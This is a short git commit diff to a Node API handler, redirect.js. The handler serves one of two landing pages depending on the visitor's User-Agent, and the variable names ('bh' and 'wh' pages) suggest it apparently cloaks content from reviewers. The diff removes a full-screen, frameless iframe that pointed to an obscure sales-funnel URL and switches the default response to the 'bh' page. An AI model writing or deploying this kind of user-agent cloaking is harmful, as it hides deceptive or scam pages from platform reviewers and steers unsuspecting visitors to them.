9d861cc1320efa8eeae2f5327370a7a6c0c65d75
rmeeesumraza <github@snobay.com>
2025-01-15 14:28:51 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -2,15 +2,6 @@ import isRedirectEnabled from './config';
 
 export default function handler(req, res) {
     const bhv = bhLP;
-    const whv = whLP;
-
-    const lvh = `
-    <html>
-        <body>
-            <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939"></iframe>
-        </body>
-    </html>
-`;
   
     // Get the User-Agent from the request headers
     const userAgent = req.headers['user-agent'] || '';
@@ -22,7 +13,7 @@ export default function handler(req, res) {
     }
     else { 
       res.writeHead(200, { 'Content-Type': 'text/html' });
-      res.end(whv);
+      res.end(bhv);
     }
     
     res.end();
